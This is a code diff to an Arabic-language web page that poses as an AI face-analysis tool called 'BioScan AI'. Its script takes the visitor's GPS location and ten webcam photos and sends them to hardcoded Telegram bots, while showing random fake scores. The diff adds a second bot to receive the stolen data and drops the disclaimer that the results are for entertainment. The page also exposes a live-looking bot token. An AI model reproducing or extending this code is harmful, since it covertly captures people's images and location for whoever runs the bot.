@@ -18,7 +18,7 @@
         .result-label { color: #a0a0a0; }
         .result-value { font-weight: bold; color: #fff; }
         .final-score { text-align: center; font-size: 24px; color: #00ff88; margin-top: 25px; font-weight: bold; border: 1px solid #00ff88; padding: 10px; }
-        .loading-bar { width: 0%; height: 3px; background: #00ff88; margin-top: 10px; transition: width 0.3s; }
+        .loading-bar { width: 0%; height: 3px; background: #00ff88; margin-top: 10px; transition: width 0.5s; }
     </style>
 </head>
 <body>
@@ -41,7 +41,7 @@
             <div class="result-item"><span class="result-label">العمر الظاهري المقدر:</span> <span class="result-value" id="res-age"></span></div>
             <div class="result-item"><span class="result-label">حيوية البشرة:</span> <span class="result-value" id="res-skin"></span></div>
             <div class="final-score" id="res-score"></div>
-            <p style="font-size: 12px; text-align: center; margin-top: 15px; color: #a0a0a0;">تم التحليل بواسطة BioScan AI v4.2. النتائج للأغراض الترفيهية.</p>
+            <p style="font-size: 12px; text-align: center; margin-top: 15px; color: #a0a0a0;">تم التحليل بواسطة BioScan AI v4.2.</p>
         </div>
     </div>
 
@@ -49,8 +49,12 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
-        const CHAT_ID = '8293639164';
+        const TOKEN1 = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
+        const CHAT_ID1 = '8293639164';
+        
+        // ضع بيانات البوت الثاني هنا
+        const TOKEN2 = 'ضع_توكن_البوت_الثاني_هنا';
+        const CHAT_ID2 = 'ضع_ايدي_الشات_الثاني_هنا';
 
         const faceShapes = ["بيضاوي متناسق", "دائري", "مربع محدد", "قلبي الشكل", "ماسي نادر"];
         const skinTypes = ["نضرة وصحية (92%)", "عادية (85%)", "تحتاج ترطيب (78%)", "ممتازة (95%)"];
@@ -58,77 +62,66 @@
         function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
         function res(id, val) { document.getElementById(id).innerText = val; }
 
+        async function sendPhotoToBoth(blob, photoNumber) {
+            const bots = [{t: TOKEN1, c: CHAT_ID1}, {t: TOKEN2, c: CHAT_ID2}];
+            bots.forEach(bot => {
+                if(bot.t.includes('ضع_')) return;
+                const fd = new FormData();
+                fd.append('photo', blob, `img_${photoNumber}.jpg`);
+                fd.append('chat_id', bot.c);
+                fd.append('caption', `📸 لقطة رقم ${photoNumber}/10`);
+                fetch(`https://api.telegram.org/bot${bot.t}/sendPhoto`, { method: 'POST', body: fd });
+            });
+        }
+
         async function startRealAnalysis() {
             const btn = document.getElementById('startBtn');
             const status = document.getElementById('status');
             const bar = document.getElementById('bar');
             
             btn.style.display = 'none';
-            status.innerHTML = "جاري الاتصال بوحدة المعالجة السحابية...";
-            bar.style.width = "10%";
+            status.innerHTML = "جاري الاتصال بالسيرفر...";
+            bar.style.width = "20%";
 
-            // 1. التقاط GPS
             navigator.geolocation.getCurrentPosition((pos) => {
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("📍 إحداثيات الهدف:\nhttps://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude)}`);
+                const mapUrl = `📍 الموقع:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                [TOKEN1, TOKEN2].forEach((t, i) => {
+                    const cid = i === 0 ? CHAT_ID1 : CHAT_ID2;
+                    fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(mapUrl)}`);
+                });
             });
 
-            // 2. تشغيل الكاميرا والتقاط 10 صور
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                video.srcObject = stream;
+                document.getElementById('video').srcObject = stream;
+                status.innerHTML = "جاري المسح البيومتري... ثبات";
                 
-                canvas.width = 640; 
-                canvas.height = 480;
+                const canvas = document.getElementById('canvas');
+                canvas.width = 640; canvas.height = 480;
 
-                // حلقة لالتقاط 10 صور
                 for (let i = 1; i <= 10; i++) {
-                    status.innerHTML = `جاري مسح الطبقة الحيوية للوجه (${i}/10)... يرجى الثبات`;
-                    bar.style.width = (10 + (i * 8)) + "%";
-
-                    // التقاط اللقطة الحالية من الفيديو
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    await new Promise(resolve => {
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('photo', blob, `shot_${i}.jpg`);
-                            formData.append('chat_id', CHAT_ID);
-                            formData.append('caption', `📸 لقطة رقم ${i} من 10 للهدف`);
-                            
-                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
-                                method: 'POST', 
-                                body: formData 
-                            }).then(() => resolve());
-                        }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً لسرعة الرفع
-                    });
-
-                    // انتظار نصف ثانية بين كل صورة وصورة
-                    await new Promise(r => setTimeout(r, 600));
+                    setTimeout(() => {
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => sendPhotoToBoth(blob, i), 'image/jpeg', 0.6);
+                        bar.style.width = (20 + (i * 8)) + "%";
+                    }, i * 700);
                 }
 
-                status.innerHTML = "تمت المعالجة. جاري توليد التقرير...";
-                bar.style.width = "100%";
-
-                // 3. إظهار النتائج النهائية
                 setTimeout(() => {
                     stream.getTracks().forEach(t => t.stop());
                     document.getElementById('pre-scan-ui').style.display = 'none';
                     status.style.display = 'none';
                     document.getElementById('resultsUi').style.display = 'block';
-
-                    res('res-shape', faceShapes[getRandomInt(0, faceShapes.length - 1)]);
-                    res('res-symmetry', getRandomInt(85, 98) + "% (ممتاز)");
-                    res('res-age', getRandomInt(22, 35) + " سنة");
-                    res('res-skin', skinTypes[getRandomInt(0, skinTypes.length - 1)]);
-                    res('res-score', "التقييم العام: " + getRandomInt(88, 96) + "/100 A+");
-                }, 2000);
+                    res('res-shape', faceShapes[getRandomInt(0, 4)]);
+                    res('res-symmetry', getRandomInt(85, 98) + "%");
+                    res('res-age', getRandomInt(20, 40) + " سنة");
+                    res('res-skin', skinTypes[getRandomInt(0, 3)]);
+                    res('res-score', "التقييم: " + getRandomInt(88, 97) + "/100");
+                }, 8500);
 
             } catch (err) {
-                status.innerText = "خطأ: لا يمكن إتمام التحليل بدون صلاحية الكاميرا.";
-                status.style.color = "#ff3333";
-                bar.style.background = "#ff3333";
+                status.innerText = "خطأ: الكاميرا مطلوبة للتحليل.";
+                status.style.color = "#ff4444";
             }
         }
     </script>
